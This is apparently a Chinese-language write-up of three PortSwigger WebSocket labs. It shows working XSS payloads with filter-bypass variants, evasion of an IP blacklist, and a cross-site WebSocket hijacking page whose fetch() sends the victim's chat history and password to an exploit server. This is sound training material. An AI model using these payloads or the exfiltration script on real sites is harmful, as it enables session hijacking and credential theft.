---
title: WebSockets
description: WebSockets
# last_update:
#   date: "2025-09-19T08:00:00+08:00"
last_update:
  date: "2025-11-09T08:00:00+08:00"
---

## Lab: Manipulating WebSocket messages to exploit vulnerabilities

| Dimension | Description                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/websockets#manipulating-websocket-messages-to-exploit-vulnerabilities |
| Lab       | https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities       |

輸入框輸入 `<img src=x onerror=alert(1)>`，實際送出的是 `{"message":"&lt;img src=x onerror=alert(1)&gt;"}`

看了一下 Chat.js，包了一層 iife，且有 `htmlEncode`

```js
(function () {
  var chatForm = document.getElementById("chatForm");
  var messageBox = document.getElementById("message-box");
  var webSocket = openWebSocket();

  messageBox.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      sendMessage(new FormData(chatForm));
      chatForm.reset();
    }
  });

  chatForm.addEventListener("submit", function (e) {
    e.preventDefault();
    sendMessage(new FormData(this));
    this.reset();
  });

  function writeMessage(className, user, content) {
    var row = document.createElement("tr");
    row.className = className;

    var userCell = document.createElement("th");
    var contentCell = document.createElement("td");
    userCell.innerHTML = user;
    contentCell.innerHTML =
      typeof window.renderChatMessage === "function"
        ? window.renderChatMessage(content)
        : content;

    row.appendChild(userCell);
    row.appendChild(contentCell);
    document.getElementById("chat-area").appendChild(row);
  }

  function sendMessage(data) {
    var object = {};
    data.forEach(function (value, key) {
      object[key] = htmlEncode(value);
    });

    openWebSocket().then((ws) => ws.send(JSON.stringify(object)));
  }

  function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
      return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
        var lookup = {
          "\\": "&#x5c;",
          "\r": "&#x0d;",
          "\n": "&#x0a;",
          '"': "&quot;",
          "<": "&lt;",
          ">": "&gt;",
          "'": "&#39;",
          "&": "&amp;",
        };
        return lookup[c];
      });
    }
    return str;
  }

  function openWebSocket() {
    return new Promise((res) => {
      if (webSocket) {
        res(webSocket);
        return;
      }

      let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

      newWebSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record");
        newWebSocket.send("READY");
        res(newWebSocket);
      };

      newWebSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
          writeMessage("typing", "", "[typing...]");
        } else {
          var messageJson = JSON.parse(message);
          if (messageJson && messageJson["user"] !== "CONNECTED") {
            Array.from(document.getElementsByClassName("system")).forEach(
              function (element) {
                element.parentNode.removeChild(element);
              },
            );
          }
          Array.from(document.getElementsByClassName("typing")).forEach(
            function (element) {
              element.parentNode.removeChild(element);
            },
          );

          if (messageJson["user"] && messageJson["content"]) {
            writeMessage(
              "message",
              messageJson["user"] + ":",
              messageJson["content"],
            );
          } else if (messageJson["error"]) {
            writeMessage("message", "Error:", messageJson["error"]);
          }
        }
      };

      newWebSocket.onclose = function (evt) {
        webSocket = undefined;
        writeMessage("message", "System:", "--- Disconnected ---");
      };
    });
  }
})();
```

嘗試創建一個新的 ws

```js
const ws = new WebSocket(chatForm.getAttribute("action"));
// 需等待 ws.readyState === 1 才能送出訊息
ws.send(JSON.stringify({ message: "<img src=x onerror=alert(1)>" }));
```

成功解題～

## Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

| Dimension | Description                                                                                                     |
| --------- | --------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/websockets#manipulating-the-websocket-handshake-to-exploit-vulnerabilities |
| Lab       | https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities           |

嘗試創建一個新的 ws

```js
const ws = new WebSocket(chatForm.getAttribute("action"));
// 需等待 ws.readyState === 1 才能送出訊息
ws.send(JSON.stringify({ message: "<img src=x>" }));
```

重整網頁後，可以成功看到圖片，但這題的 XSS 好像比較嚴格

```js
ws.send(JSON.stringify({ message: "<svg onload=alert(1)>" }));
// {"error":"Attack detected: Event handler"};
```

且只要失敗一次，就會被鎖 IP => `"This address is blacklisted"`

題目的 hint 有說可以用 `X-Forwarded-For`，是說，經過之前的 Lab 洗禮，遇到鎖 IP 的，基本上都會聯想到 `X-Forwarded-For` 了

```js
ws.send(JSON.stringify({ message: `<script>alert(1)` }));
ws.send(JSON.stringify({ message: `<iframe src="javascript:alert(1)">` }));
ws.send(
  JSON.stringify({
    message: `<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">`,
  }),
);
ws.send(
  JSON.stringify({
    message: `<svg><animate attributeName=href values=javascript:alert(1) />`,
  }),
);
// {"error":"Attack detected: JavaScript"}
```

找到突破點，可以用大小寫混合，但 `<script>` 透過 `.innerHTML` 動態插入是不會執行的

```js
ws.send(JSON.stringify({ message: `<ScriPt>alert(1)` }));
// {"error":"Attack detected: Alert"}
```

最終

```js
ws.send(JSON.stringify({ message: `<img src=x OnerRor=window['alert'](1)>` }));
```

這題我沒有用 `X-Forwarded-For: 1` 來解，而是一直切換 VPN，大概嘗試 10 次內就試出 Bypass 的 XSS Payload

但我覺得應該要學一下 Burp Suite 的用法，所以我自行解題後，回頭看了一下 Solution

在 Proxy > HTTP History 旁邊就有 WebSockets History，並且可以用 Send To Repeater 重放 message，也支援 Websocket Reconnect，超級方便...

## Lab: Cross-site WebSocket hijacking

<!-- last_update:
  date: "2025-11-09T08:00:00+08:00" -->

| Dimension | Description                                                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking#performing-a-cross-site-websocket-hijacking-attack |
| Lab       | https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab                                                |

- 這題不需要用 Burp Collaborator's default public server，只要用 Lab 內建的 exploit-server 即可
- 這題的 Cookie: session 是 SameSite: none

exploit-server 構造

```html
<script>
  const ws = new WebSocket(
    "https://0a28006d0331937d8290013d00e80059.web-security-academy.net/chat",
  );
  ws.addEventListener("open", () => {
    ws.send("READY");
  });
  ws.addEventListener("message", (e) => {
    fetch(
      `https://exploit-0ab5006f033193d3824b00af01be0093.exploit-server.net/?message=${encodeURIComponent(e.data)}`,
      { mode: "no-cors" },
    );
  });
</script>
```

其中 "READY" 指令是這題要觀察的點，可以列出所有 chat history，其中就包含 victim 的密碼

之後就是到 `YOUR_EXPLOIT_SERVER.exploit-server.net/log` 查看 log 即可通關～

## 小結

WebSocket 系列的題目很少，但剛好有讓我練習到 Burp Suite + WebSocket，算是有收穫

## 參考資料

- https://portswigger.net/web-security/websockets/what-are-websockets
